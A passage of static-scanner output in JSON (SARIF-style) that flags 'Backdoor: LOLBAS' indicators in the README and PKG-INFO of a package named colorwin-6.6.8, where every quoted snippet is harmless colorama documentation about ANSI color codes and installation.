                      "text": "    ESC [ n C       # move cursor n characters forward\n    ESC [ n D       # move cursor n characters backward\n\n    # clear the screen\n    ESC [ mode J    # clear the screen\n\n    # clear the line\n    ESC [ mode K    # clear the line\n",
                      "markdown": "`    ESC [ n C       # move cursor n characters forward\n    ESC [ n D       # move cursor n characters backward\n\n    # clear the screen\n    ESC [ mode J    # clear the screen\n\n    # clear the line\n    ESC [ mode K    # clear the line\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 263,
                  "startColumn": 21,
                  "endLine": 264,
                  "snippet": {
                    "text": "\n    # BACKGROUND\n    ESC [ 40 m      # black\n    ESC [ 41 m      # red\n    ESC [ 42 m      # green\n    ESC [ 43 m      # yellow\n    ESC [ 44 m      # blue\n    ESC [ 45 m      # magenta\n",
                    "rendered": {
                      "text": "\n    # BACKGROUND\n    ESC [ 40 m      # black\n    ESC [ 41 m      # red\n    ESC [ 42 m      # green\n    ESC [ 43 m      # yellow\n    ESC [ 44 m      # blue\n    ESC [ 45 m      # magenta\n",
                      "markdown": "`\n    # BACKGROUND\n    ESC [ 40 m      # black\n    ESC [ 41 m      # red\n    ESC [ 42 m      # green\n    ESC [ 43 m      # yellow\n    ESC [ 44 m      # blue\n    ESC [ 45 m      # magenta\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 252,
                  "startColumn": 21,
                  "endLine": 253,
                  "snippet": {
                    "text": "\n    # FOREGROUND:\n    ESC [ 30 m      # black\n    ESC [ 31 m      # red\n    ESC [ 32 m      # green\n    ESC [ 33 m      # yellow\n    ESC [ 34 m      # blue\n    ESC [ 35 m      # magenta\n",
                    "rendered": {
                      "text": "\n    # FOREGROUND:\n    ESC [ 30 m      # black\n    ESC [ 31 m      # red\n    ESC [ 32 m      # green\n    ESC [ 33 m      # yellow\n    ESC [ 34 m      # blue\n    ESC [ 35 m      # magenta\n",
                      "markdown": "`\n    # FOREGROUND:\n    ESC [ 30 m      # black\n    ESC [ 31 m      # red\n    ESC [ 32 m      # green\n    ESC [ 33 m      # yellow\n    ESC [ 34 m      # blue\n    ESC [ 35 m      # magenta\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 193,
                  "startColumn": 30,
                  "endLine": 193,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\n        from colorama import init\n        init(autoreset=True)\n        print(Fore.RED + 'some red text')\n        print('automatically back to default color again')\n\ninit(strip=None):\n",
                    "rendered": {
                      "text": "\n        from colorama import init\n        init(autoreset=True)\n        print(Fore.RED + 'some red text')\n        print('automatically back to default color again')\n\ninit(strip=None):\n",
                      "markdown": "`\n        from colorama import init\n        init(autoreset=True)\n        print(Fore.RED + 'some red text')\n        print('automatically back to default color again')\n\ninit(strip=None):\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 185,
                  "startColumn": 10,
                  "endLine": 185,
                  "endColumn": 16,
                  "snippet": {
                    "text": "``init()`` accepts some ``**kwargs`` to override default behaviour.\n\ninit(autoreset=False):\n    If you find yourself repeatedly sending reset sequences to turn off color\n    changes at the end of every print, then ``init(autoreset=True)`` will\n    automate that:\n\n",
                    "rendered": {
                      "text": "``init()`` accepts some ``**kwargs`` to override default behaviour.\n\ninit(autoreset=False):\n    If you find yourself repeatedly sending reset sequences to turn off color\n    changes at the end of every print, then ``init(autoreset=True)`` will\n    automate that:\n\n",
                      "markdown": "```init()`` accepts some ``**kwargs`` to override default behaviour.\n\ninit(autoreset=False):\n    If you find yourself repeatedly sending reset sequences to turn off color\n    changes at the end of every print, then ``init(autoreset=True)`` will\n    automate that:\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 141,
                  "startColumn": 6,
                  "endLine": 141,
                  "endColumn": 12,
                  "snippet": {
                    "text": "the fabulous `Blessings <https://pypi.org/project/blessings/>`_,\nor the incredible `_Rich <https://pypi.org/project/rich/>`_.\n\nIf you wish Colorama's Fore, Back and Style constants were more capable,\nthen consider using one of the above highly capable libraries to generate\ncolors, etc, and use Colorama just for its primary purpose: to convert\nthose ANSI sequences to also work on Windows:\n",
                    "rendered": {
                      "text": "the fabulous `Blessings <https://pypi.org/project/blessings/>`_,\nor the incredible `_Rich <https://pypi.org/project/rich/>`_.\n\nIf you wish Colorama's Fore, Back and Style constants were more capable,\nthen consider using one of the above highly capable libraries to generate\ncolors, etc, and use Colorama just for its primary purpose: to convert\nthose ANSI sequences to also work on Windows:\n",
                      "markdown": "`the fabulous `Blessings <https://pypi.org/project/blessings/>`_,\nor the incredible `_Rich <https://pypi.org/project/rich/>`_.\n\nIf you wish Colorama's Fore, Back and Style constants were more capable,\nthen consider using one of the above highly capable libraries to generate\ncolors, etc, and use Colorama just for its primary purpose: to convert\nthose ANSI sequences to also work on Windows:\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 133,
                  "startColumn": 28,
                  "endLine": 133,
                  "endColumn": 33,
                  "snippet": {
                    "text": "\n.. code-block:: python\n\n    print('\\033[31m' + 'some red text')\n    print('\\033[39m') # and reset to default color\n\n...or, Colorama can be used in conjunction with existing ANSI libraries\n",
                    "rendered": {
                      "text": "\n.. code-block:: python\n\n    print('\\033[31m' + 'some red text')\n    print('\\033[39m') # and reset to default color\n\n...or, Colorama can be used in conjunction with existing ANSI libraries\n",
                      "markdown": "`\n.. code-block:: python\n\n    print('\\033[31m' + 'some red text')\n    print('\\033[39m') # and reset to default color\n\n...or, Colorama can be used in conjunction with existing ANSI libraries\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 123,
                  "startColumn": 26,
                  "endLine": 123,
                  "endColumn": 31,
                  "snippet": {
                    "text": ".. code-block:: python\n\n    from colorama import Fore, Back, Style\n    print(Fore.RED + 'some red text')\n    print(Back.GREEN + 'and with a green background')\n    print(Style.DIM + 'and in dim text')\n    print(Style.RESET_ALL)\n",
                    "rendered": {
                      "text": ".. code-block:: python\n\n    from colorama import Fore, Back, Style\n    print(Fore.RED + 'some red text')\n    print(Back.GREEN + 'and with a green background')\n    print(Style.DIM + 'and in dim text')\n    print(Style.RESET_ALL)\n",
                      "markdown": "`.. code-block:: python\n\n    from colorama import Fore, Back, Style\n    print(Fore.RED + 'some red text')\n    print(Back.GREEN + 'and with a green background')\n    print(Style.DIM + 'and in dim text')\n    print(Style.RESET_ALL)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 3,
                  "endLine": 39,
                  "endColumn": 8,
                  "snippet": {
                    "text": "\n.. code-block:: bash\n\n    pip install colorama\n    # or\n    conda install -c anaconda colorama\n\n",
                    "rendered": {
                      "text": "\n.. code-block:: bash\n\n    pip install colorama\n    # or\n    conda install -c anaconda colorama\n\n",
                      "markdown": "`\n.. code-block:: bash\n\n    pip install colorama\n    # or\n    conda install -c anaconda colorama\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 15,
                  "endLine": 38,
                  "snippet": {
                    "text": "\nNo requirements other than the standard library.\n\n.. code-block:: bash\n\n    pip install colorama\n    # or\n    conda install -c anaconda colorama\n",
                    "rendered": {
                      "text": "\nNo requirements other than the standard library.\n\n.. code-block:: bash\n\n    pip install colorama\n    # or\n    conda install -c anaconda colorama\n",
                      "markdown": "`\nNo requirements other than the standard library.\n\n.. code-block:: bash\n\n    pip install colorama\n    # or\n    conda install -c anaconda colorama\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/README.rst"
                },
                "region": {
                  "startLine": 27,
                  "startColumn": 6,
                  "endLine": 27,
                  "endColumn": 12,
                  "snippet": {
                    "text": "`Github for source <https://github.com/tartley/colorama>`_ |\n`Colorama for enterprise on Tidelift <https://github.com/tartley/colorama/blob/master/ENTERPRISE.md>`_\n\nIf you find Colorama useful, please |donate| to the authors. Thank you!\n\n\nInstallation\n",
                    "rendered": {
                      "text": "`Github for source <https://github.com/tartley/colorama>`_ |\n`Colorama for enterprise on Tidelift <https://github.com/tartley/colorama/blob/master/ENTERPRISE.md>`_\n\nIf you find Colorama useful, please |donate| to the authors. Thank you!\n\n\nInstallation\n",
                      "markdown": "``Github for source <https://github.com/tartley/colorama>`_ |\n`Colorama for enterprise on Tidelift <https://github.com/tartley/colorama/blob/master/ENTERPRISE.md>`_\n\nIf you find Colorama useful, please |donate| to the authors. Thank you!\n\n\nInstallation\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 391,
                  "startColumn": 7,
                  "endLine": 391,
                  "endColumn": 11,
                  "snippet": {
                    "text": "* User 'eryksun', for guidance on correctly instantiating ``ctypes.windll``.\r\n* Matthew McCormick for politely pointing out a longstanding crash on non-Win.\r\n* Ben Hoyt, for a magnificent fix under 64-bit Windows.\r\n* Jesse at Empty Square for submitting a fix for examples in the README.\r\n* User 'jamessp', an observant documentation fix for cursor positioning.\r\n* User 'vaal1239', Dave Mckee & Lackner Kristof for a tiny but much-needed Win7\r\n  fix.\r\n",
                    "rendered": {
                      "text": "* User 'eryksun', for guidance on correctly instantiating ``ctypes.windll``.\r\n* Matthew McCormick for politely pointing out a longstanding crash on non-Win.\r\n* Ben Hoyt, for a magnificent fix under 64-bit Windows.\r\n* Jesse at Empty Square for submitting a fix for examples in the README.\r\n* User 'jamessp', an observant documentation fix for cursor positioning.\r\n* User 'vaal1239', Dave Mckee & Lackner Kristof for a tiny but much-needed Win7\r\n  fix.\r\n",
                      "markdown": "`* User 'eryksun', for guidance on correctly instantiating ``ctypes.windll``.\r\n* Matthew McCormick for politely pointing out a longstanding crash on non-Win.\r\n* Ben Hoyt, for a magnificent fix under 64-bit Windows.\r\n* Jesse at Empty Square for submitting a fix for examples in the README.\r\n* User 'jamessp', an observant documentation fix for cursor positioning.\r\n* User 'vaal1239', Dave Mckee & Lackner Kristof for a tiny but much-needed Win7\r\n  fix.\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 305,
                  "startColumn": 37,
                  "endLine": 305,
                  "endColumn": 41,
                  "snippet": {
                    "text": "\r\n    # cursor positioning\r\n    ESC [ y;x H     # position cursor at x across, y down\r\n    ESC [ y;x f     # position cursor at x across, y down\r\n    ESC [ n A       # move cursor n lines up\r\n    ESC [ n B       # move cursor n lines down\r\n    ESC [ n C       # move cursor n characters forward\r\n",
                    "rendered": {
                      "text": "\r\n    # cursor positioning\r\n    ESC [ y;x H     # position cursor at x across, y down\r\n    ESC [ y;x f     # position cursor at x across, y down\r\n    ESC [ n A       # move cursor n lines up\r\n    ESC [ n B       # move cursor n lines down\r\n    ESC [ n C       # move cursor n characters forward\r\n",
                      "markdown": "`\r\n    # cursor positioning\r\n    ESC [ y;x H     # position cursor at x across, y down\r\n    ESC [ y;x f     # position cursor at x across, y down\r\n    ESC [ n A       # move cursor n lines up\r\n    ESC [ n B       # move cursor n lines down\r\n    ESC [ n C       # move cursor n characters forward\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 304,
                  "startColumn": 37,
                  "endLine": 304,
                  "endColumn": 41,
                  "snippet": {
                    "text": "    ESC [ 49 m      # reset\r\n\r\n    # cursor positioning\r\n    ESC [ y;x H     # position cursor at x across, y down\r\n    ESC [ y;x f     # position cursor at x across, y down\r\n    ESC [ n A       # move cursor n lines up\r\n    ESC [ n B       # move cursor n lines down\r\n",
                    "rendered": {
                      "text": "    ESC [ 49 m      # reset\r\n\r\n    # cursor positioning\r\n    ESC [ y;x H     # position cursor at x across, y down\r\n    ESC [ y;x f     # position cursor at x across, y down\r\n    ESC [ n A       # move cursor n lines up\r\n    ESC [ n B       # move cursor n lines down\r\n",
                      "markdown": "`    ESC [ 49 m      # reset\r\n\r\n    # cursor positioning\r\n    ESC [ y;x H     # position cursor at x across, y down\r\n    ESC [ y;x f     # position cursor at x across, y down\r\n    ESC [ n A       # move cursor n lines up\r\n    ESC [ n B       # move cursor n lines down\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 217,
                  "startColumn": 11,
                  "endLine": 217,
                  "endColumn": 15,
                  "snippet": {
                    "text": "\r\ninit(autoreset=False):\r\n    If you find yourself repeatedly sending reset sequences to turn off color\r\n    changes at the end of every print, then ``init(autoreset=True)`` will\r\n    automate that:\r\n\r\n    .. code-block:: python\r\n",
                    "rendered": {
                      "text": "\r\ninit(autoreset=False):\r\n    If you find yourself repeatedly sending reset sequences to turn off color\r\n    changes at the end of every print, then ``init(autoreset=True)`` will\r\n    automate that:\r\n\r\n    .. code-block:: python\r\n",
                      "markdown": "`\r\ninit(autoreset=False):\r\n    If you find yourself repeatedly sending reset sequences to turn off color\r\n    changes at the end of every print, then ``init(autoreset=True)`` will\r\n    automate that:\r\n\r\n    .. code-block:: python\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 68,
                  "startColumn": 15,
                  "endLine": 68,
                  "endColumn": 21,
                  "snippet": {
                    "text": "\r\nNo requirements other than the standard library.\r\n\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n",
                    "rendered": {
                      "text": "\r\nNo requirements other than the standard library.\r\n\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n",
                      "markdown": "`\r\nNo requirements other than the standard library.\r\n\r\n.. code-block:: bash\r\n\r\n    pip install colorama\r\n    # or\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 312,
                  "startColumn": 31,
                  "endLine": 312,
                  "endColumn": 39,
                  "snippet": {
                    "text": "    ESC [ n D       # move cursor n characters backward\r\n\r\n    # clear the screen\r\n    ESC [ mode J    # clear the screen\r\n\r\n    # clear the line\r\n    ESC [ mode K    # clear the line\r\n",
                    "rendered": {
                      "text": "    ESC [ n D       # move cursor n characters backward\r\n\r\n    # clear the screen\r\n    ESC [ mode J    # clear the screen\r\n\r\n    # clear the line\r\n    ESC [ mode K    # clear the line\r\n",
                      "markdown": "`    ESC [ n D       # move cursor n characters backward\r\n\r\n    # clear the screen\r\n    ESC [ mode J    # clear the screen\r\n\r\n    # clear the line\r\n    ESC [ mode K    # clear the line\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 311,
                  "startColumn": 15,
                  "endLine": 311,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    ESC [ n C       # move cursor n characters forward\r\n    ESC [ n D       # move cursor n characters backward\r\n\r\n    # clear the screen\r\n    ESC [ mode J    # clear the screen\r\n\r\n    # clear the line\r\n",
                    "rendered": {
                      "text": "    ESC [ n C       # move cursor n characters forward\r\n    ESC [ n D       # move cursor n characters backward\r\n\r\n    # clear the screen\r\n    ESC [ mode J    # clear the screen\r\n\r\n    # clear the line\r\n",
                      "markdown": "`    ESC [ n C       # move cursor n characters forward\r\n    ESC [ n D       # move cursor n characters backward\r\n\r\n    # clear the screen\r\n    ESC [ mode J    # clear the screen\r\n\r\n    # clear the line\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 294,
                  "startColumn": 21,
                  "endLine": 294,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\r\n    # BACKGROUND\r\n    ESC [ 40 m      # black\r\n    ESC [ 41 m      # red\r\n    ESC [ 42 m      # green\r\n    ESC [ 43 m      # yellow\r\n    ESC [ 44 m      # blue\r\n",
                    "rendered": {
                      "text": "\r\n    # BACKGROUND\r\n    ESC [ 40 m      # black\r\n    ESC [ 41 m      # red\r\n    ESC [ 42 m      # green\r\n    ESC [ 43 m      # yellow\r\n    ESC [ 44 m      # blue\r\n",
                      "markdown": "`\r\n    # BACKGROUND\r\n    ESC [ 40 m      # black\r\n    ESC [ 41 m      # red\r\n    ESC [ 42 m      # green\r\n    ESC [ 43 m      # yellow\r\n    ESC [ 44 m      # blue\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 283,
                  "startColumn": 21,
                  "endLine": 283,
                  "endColumn": 26,
                  "snippet": {
                    "text": "\r\n    # FOREGROUND:\r\n    ESC [ 30 m      # black\r\n    ESC [ 31 m      # red\r\n    ESC [ 32 m      # green\r\n    ESC [ 33 m      # yellow\r\n    ESC [ 34 m      # blue\r\n",
                    "rendered": {
                      "text": "\r\n    # FOREGROUND:\r\n    ESC [ 30 m      # black\r\n    ESC [ 31 m      # red\r\n    ESC [ 32 m      # green\r\n    ESC [ 33 m      # yellow\r\n    ESC [ 34 m      # blue\r\n",
                      "markdown": "`\r\n    # FOREGROUND:\r\n    ESC [ 30 m      # black\r\n    ESC [ 31 m      # red\r\n    ESC [ 32 m      # green\r\n    ESC [ 33 m      # yellow\r\n    ESC [ 34 m      # blue\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 224,
                  "startColumn": 30,
                  "endLine": 224,
                  "endColumn": 35,
                  "snippet": {
                    "text": "\r\n        from colorama import init\r\n        init(autoreset=True)\r\n        print(Fore.RED + 'some red text')\r\n        print('automatically back to default color again')\r\n\r\ninit(strip=None):\r\n",
                    "rendered": {
                      "text": "\r\n        from colorama import init\r\n        init(autoreset=True)\r\n        print(Fore.RED + 'some red text')\r\n        print('automatically back to default color again')\r\n\r\ninit(strip=None):\r\n",
                      "markdown": "`\r\n        from colorama import init\r\n        init(autoreset=True)\r\n        print(Fore.RED + 'some red text')\r\n        print('automatically back to default color again')\r\n\r\ninit(strip=None):\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 216,
                  "startColumn": 10,
                  "endLine": 216,
                  "endColumn": 16,
                  "snippet": {
                    "text": "``init()`` accepts some ``**kwargs`` to override default behaviour.\r\n\r\ninit(autoreset=False):\r\n    If you find yourself repeatedly sending reset sequences to turn off color\r\n    changes at the end of every print, then ``init(autoreset=True)`` will\r\n    automate that:\r\n\r\n",
                    "rendered": {
                      "text": "``init()`` accepts some ``**kwargs`` to override default behaviour.\r\n\r\ninit(autoreset=False):\r\n    If you find yourself repeatedly sending reset sequences to turn off color\r\n    changes at the end of every print, then ``init(autoreset=True)`` will\r\n    automate that:\r\n\r\n",
                      "markdown": "```init()`` accepts some ``**kwargs`` to override default behaviour.\r\n\r\ninit(autoreset=False):\r\n    If you find yourself repeatedly sending reset sequences to turn off color\r\n    changes at the end of every print, then ``init(autoreset=True)`` will\r\n    automate that:\r\n\r\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/colorwin-6.6.8.tar.gz/colorwin-6.6.8.tar/colorwin-6.6.8/colorwin.egg-info/PKG-INFO"
                },
                "region": {
                  "startLine": 172,
                  "startColumn": 6,
                  "endLine": 172,
                  "endColumn": 12,
                  "snippet": {
                    "text": "the fabulous `Blessings <https://pypi.org/project/blessings/>`_,\r\nor the incredible `_Rich <https://pypi.org/project/rich/>`_.\r\n\r\nIf you wish Colorama's Fore, Back and Style constants were more capable,\r\nthen consider using one of the above highly capable libraries to generate\r\ncolors, etc, and use Colorama just for its primary purpose: to convert\r\nthose ANSI sequences to also work on Windows:\r\n",
                    "rendered": {
